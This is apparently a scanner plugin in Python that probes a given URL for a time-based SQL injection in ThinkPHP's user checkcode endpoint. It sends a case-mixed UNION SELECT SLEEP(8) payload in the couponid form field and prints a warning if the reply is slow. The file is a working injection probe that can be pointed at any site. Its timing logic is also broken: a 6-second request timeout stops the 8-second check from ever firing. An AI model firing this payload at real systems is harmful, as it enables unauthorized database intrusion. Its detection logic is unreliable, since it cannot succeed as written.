# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  ThinkPHP_Checkcode_Time_Sqli.py
@Desc:
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging
import time

def ThinkPHP_Checkcode_Time_Sqli(Url):
    scheme, url, port = umethod(Url)
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
        "DNT": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Content-Type": "multipart/form-data; boundary=--------641902708",
        "Accept-Encoding": "gzip, deflate, sdch",
        "Accept-Language": "zh-CN,zh;q=0.8",
    }
    payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--"
    try:
        start_time = time.time()
        payload_url = scheme + "://" + url + ":" + str(port) + "/index.php?s=/home/user/checkcode/"
        resp = requests.get(payload_url, headers=headers,data=payload, timeout=6, verify=False)
        if time.time() - start_time >= 8:
            print(Vcolors.RED +"[!] 存在ThinkPHP SQL注入漏洞:->ThinkPHP_Checkcode_Time_Sqli\r" + Vcolors.ENDC)
    except:
        logging.error("ThinkPHP_Checkcode_Time_Sqli脚本出现异常")